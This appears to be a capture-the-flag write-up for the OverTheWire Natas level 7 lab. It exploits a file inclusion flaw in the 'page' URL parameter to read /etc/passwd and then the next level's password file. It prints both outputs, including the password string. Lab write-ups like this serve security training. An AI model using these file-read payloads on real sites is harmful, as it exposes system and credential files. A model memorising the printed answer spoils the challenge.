# Solution
There are 2 sites on the webpage that is navigated to via param
```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

This hints us at a file inclusion error. Which our test payload of `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd` returns:
```
[Home](http://natas7.natas.labs.overthewire.org/index.php?page=home) [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)  
  
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## Exploit
`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas7`

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```